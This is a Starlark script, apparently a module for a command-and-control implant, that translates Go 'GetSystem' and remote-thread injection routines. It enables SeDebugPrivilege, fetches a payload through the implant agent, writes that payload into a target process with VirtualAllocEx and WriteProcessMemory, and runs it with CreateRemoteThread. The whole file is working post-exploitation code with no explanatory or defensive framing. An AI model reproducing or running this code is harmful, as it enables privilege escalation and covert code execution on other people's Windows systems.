# Strict 1:1 Starlark translation of GetSystem(data []byte, hostingProcess string),
# RemoteTask(processID int, data []byte, rwxPages bool), and injectTask(processHandle, data, rwxPages) from priv_windows.go & task_windows.go

TOKEN_ADJUST_PRIVILEGES = 0x0020
SE_PRIVILEGE_ENABLED = 0x00000002

MEM_COMMIT = 0x1000
MEM_RESERVE = 0x2000
PAGE_READWRITE = 0x04
PAGE_EXECUTE_READ = 0x20
PAGE_EXECUTE_READWRITE = 0x40

PROCESS_CREATE_THREAD = 0x0002
PROCESS_VM_OPERATION = 0x0008
PROCESS_VM_READ = 0x0010
PROCESS_VM_WRITE = 0x0020
PROCESS_QUERY_INFORMATION = 0x0400


def SePrivEnable(s):
    res = win_call("kernel32.dll", "GetCurrentProcess")
    ths_handle = res["r1"]
    if ths_handle == 0:
        return "GetCurrentProcess failed"

    token_ptr = win_alloc(8)
    res = win_call(
        "advapi32.dll",
        "OpenProcessToken",
        ths_handle,
        TOKEN_ADJUST_PRIVILEGES,
        token_ptr,
    )
    if res["r1"] == 0:
        win_free(token_ptr)
        return "OpenProcessToken failed"

    token_handle = read_u64(token_ptr, 0)
    win_free(token_ptr)

    luid_ptr = win_alloc(8)
    res = win_call("advapi32.dll", "LookupPrivilegeValueW", 0, s, luid_ptr)
    if res["r1"] == 0:
        win_free(luid_ptr)
        win_call("kernel32.dll", "CloseHandle", token_handle)
        return "LookupPrivilegeValueW failed"

    luid_val = read_u64(luid_ptr, 0)
    win_free(luid_ptr)

    tp_buf = win_alloc(16)
    write_u32(tp_buf, 0, 1)
    write_u64(tp_buf, 4, luid_val)
    write_u32(tp_buf, 12, SE_PRIVILEGE_ENABLED)

    res = win_call(
        "advapi32.dll", "AdjustTokenPrivileges", token_handle, 0, tp_buf, 0, 0, 0
    )
    win_free(tp_buf)
    win_call("kernel32.dll", "CloseHandle", token_handle)

    if res["r1"] == 0:
        return "AdjustTokenPrivileges failed"

    return None


def injectTask(process_handle, payload_bytes, rwx_pages=False):
    data_size = len(payload_bytes)
    if data_size == 0:
        return 0, "Payload data size is 0"

    perms = PAGE_EXECUTE_READWRITE if rwx_pages else PAGE_READWRITE

    # VirtualAllocEx(processHandle, uintptr(0), uintptr(uint32(dataSize)), MEM_COMMIT|MEM_RESERVE, perms)
    res_alloc = win_call(
        "kernel32.dll",
        "VirtualAllocEx",
        process_handle,
        0,
        data_size,
        MEM_COMMIT | MEM_RESERVE,
        perms,
    )
    remote_addr = res_alloc["r1"]
    if remote_addr == 0:
        return 0, "VirtualAllocEx failed: " + str(res_alloc.get("error"))

    # Write payload data to remote process memory via WriteProcessMemory
    local_buf = win_alloc(data_size)
    for i in range(data_size):
        b = payload_bytes[i]
        val = b if type(b) == "int" else ord(b)
        write_u8(local_buf, i, val)

    written_ptr = win_alloc(8)
    res_write = win_call(
        "kernel32.dll",
        "WriteProcessMemory",
        process_handle,
        remote_addr,
        local_buf,
        data_size,
        written_ptr,
    )
    win_free(local_buf)
    win_free(written_ptr)

    if res_write["r1"] == 0:
        return 0, "WriteProcessMemory failed: " + str(res_write.get("error"))

    if not rwx_pages:
        old_prot_ptr = win_alloc(4)
        res_prot = win_call(
            "kernel32.dll",
            "VirtualProtectEx",
            process_handle,
            remote_addr,
            data_size,
            PAGE_EXECUTE_READ,
            old_prot_ptr,
        )
        win_free(old_prot_ptr)
        if res_prot["r1"] == 0:
            return 0, "VirtualProtectEx failed: " + str(res_prot.get("error"))

    # CreateRemoteThread(processHandle, attr, 0, remoteAddr, 0, 0, &lpThreadId)
    thread_id_ptr = win_alloc(4)
    res_thread = win_call(
        "kernel32.dll",
        "CreateRemoteThread",
        process_handle,
        0,
        0,
        remote_addr,
        0,
        0,
        thread_id_ptr,
    )
    thread_handle = res_thread["r1"]
    thread_id = read_u32(thread_id_ptr, 0)
    win_free(thread_id_ptr)

    if thread_handle == 0:
        return 0, "CreateRemoteThread failed: " + str(res_thread.get("error"))

    print(
        "[+] Remote thread created successfully (Handle: 0x%x, Thread ID: %d)"
        % (thread_handle, thread_id)
    )
    return thread_handle, None


def RemoteTask(process_id, payload_bytes, rwx_pages=False):
    access = (
        PROCESS_CREATE_THREAD
        | PROCESS_QUERY_INFORMATION
        | PROCESS_VM_OPERATION
        | PROCESS_VM_WRITE
        | PROCESS_VM_READ
    )
    proc_res = win_call("kernel32.dll", "OpenProcess", access, 0, process_id)
    process_handle = proc_res["r1"]
    if process_handle == 0:
        return "OpenProcess (PID %d) failed: %s" % (
            process_id,
            str(proc_res.get("error")),
        )

    thread_handle, err = injectTask(process_handle, payload_bytes, rwx_pages)
    if thread_handle != 0:
        win_call("kernel32.dll", "CloseHandle", thread_handle)
    win_call("kernel32.dll", "CloseHandle", process_handle)

    return err


def find_process_by_name(exe_name_target):
    TH32CS_SNAPPROCESS = 0x00000002
    res = win_call("kernel32.dll", "CreateToolhelp32Snapshot", TH32CS_SNAPPROCESS, 0)
    h_snap = res.get("r1", 0)
    if h_snap == 0 or h_snap == 0xFFFFFFFFFFFFFFFF:
        return 0

    entry = win_alloc(560)
    write_u32(entry, 0, 560)

    target_pid = 0
    res = win_call("kernel32.dll", "Process32FirstW", h_snap, entry)
    for _ in range(4096):
        if res.get("r1", 0) == 0:
            break
        pid = read_u32(entry, 8)
        exe_name = read_wstring(entry + 44, 260)
        if exe_name.lower() == exe_name_target.lower():
            target_pid = pid
            break
        res = win_call("kernel32.dll", "Process32NextW", h_snap, entry)

    win_free(entry)
    win_call("kernel32.dll", "CloseHandle", h_snap)
    return target_pid


def Impersonate(payload_bytes, target_pid=0):
    print("[*] GetSystem: Enabling SeDebugPrivilege...")
    err = SePrivEnable("SeDebugPrivilege")
    if err != None:
        print("[-] SePrivEnable failed: %s" % err)
        return "Fail: " + err

    if target_pid == 0:
        return "Fail: Target PID required"

    print(
        "[*] Injecting %d bytes of payload into process PID %d..."
        % (len(payload_bytes), target_pid)
    )
    err = RemoteTask(target_pid, payload_bytes, False)
    if err != None:
        print("[-] RemoteTask failed: %s" % err)
        return "Fail: " + err

    print("[+] GetSystem succeeded via process injection into PID %d" % target_pid)
    return "OK"


def main(*args):
    pid = int(args[0])
    payload_file = args[1]
    checksum = args[2]

    if not payload_file:
        return "Fail: payload_file parameter is required"

    print("[*] Fetching payload %s via agent.fetch_file..." % payload_file)
    payload_bytes = agent.fetch_file(
        file_to_download=payload_file,
        checksum=checksum,
    )
    if not payload_bytes:
        print("[-] Failed to fetch payload file: %s" % payload_file)
        return "Fail: fetch_file failed"

    print(
        "[+] Downloaded %d bytes of payload data for %s"
        % (len(payload_bytes), payload_file)
    )
    return Impersonate(payload_bytes, pid)
